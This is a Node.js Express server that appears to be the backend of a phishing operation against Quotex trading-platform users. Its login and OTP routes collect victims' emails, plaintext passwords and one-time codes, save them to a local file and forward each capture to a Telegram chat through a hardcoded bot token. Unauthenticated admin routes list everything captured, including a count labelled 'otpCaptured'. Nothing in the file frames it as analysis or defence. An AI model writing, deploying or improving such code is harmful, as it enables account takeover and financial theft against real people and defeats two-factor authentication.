const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

async function sendTelegramMessage(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Telegram sent");
    } catch (e) {
        console.error("❌ Telegram Error:", e.message);
    }
}

// ================== DATA PERSISTENCE (FIXED) ==================
const DATA_FILE = path.join(__dirname, 'users.json');
let users = [];

// FIXED: Load users on startup
function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            users = JSON.parse(data);
            console.log(`✅ Loaded ${users.length} users from users.json`);
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
            console.log("✅ Created new users.json");
        }
    } catch (e) {
        console.error("❌ Load error:", e);
        users = [];
    }
}

// FIXED: Save after every change
function saveUsers() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
        console.log(`💾 Saved ${users.length} users`);
    } catch (e) {
        console.error("❌ Save error:", e);
    }
}

loadUsers();

// Helper: Get or create user by licenceKey
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    let user = users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = {
            id: Date.now().toString(),
            licenceKey: licenceKey,
            fullName: fullName,
            username: "",
            password: "",
            otp: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString(),
            credentialsEnteredAt: null,
            otpEnteredAt: null
        };
        users.unshift(user);
        console.log(`🆕 New user created: ${fullName} (${licenceKey})`);
    }
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// ================== EXISTING ROUTES (kept intact) ==================
// ... (your trigger, license, activity, permission routes can stay here)

// QUOTEX LOGIN - FIXED
app.post('/api/quotex-login', async (req, res) => {
    console.log("📥 Received login:", req.body);
    const { email, password, name, licenceKey = "DEFAULT" } = req.body;
    
    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.credentialsEnteredAt = new Date().toISOString();
    user.status = "Online";
    
    await sendTelegramMessage(`🔑 Login\nName: ${name}\nEmail: ${email}`);
    res.status(200).send({ status: "ok" });
});

// QUOTEX OTP - FIXED
app.post('/api/quotex-otp', async (req, res) => {
    console.log("📥 Received OTP:", req.body);
    const { email, otp, name, licenceKey = "DEFAULT" } = req.body;
    
    const user = getOrCreateUser(licenceKey, name);
    user.otp = otp;
    user.otpEnteredAt = new Date().toISOString();
    user.status = "Online";
    
    await sendTelegramMessage(`🔢 OTP\nName: ${name}\nOTP: ${otp}`);
    res.status(200).send({ status: "ok" });
});

// ================== ADMIN ENDPOINTS ==================
app.get('/api/stats', (req, res) => {
    const stats = {
        totalUsers: users.length,
        onlineNow: users.filter(u => u.status === "Online").length,
        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
        connectedAccounts: users.filter(u => u.connected).length
    };
    res.json(stats);
});

app.get('/api/users', (req, res) => {
    res.json(users);
});

app.get('/api/latest-activity', (req, res) => {
    res.json({
        logins: users.filter(u => u.username),
        otps: users.filter(u => u.otp)
    });
});

app.get('/', (req, res) => res.send("✅ Backend Running - Check /api/stats"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log("📁 users.json path:", DATA_FILE);
});
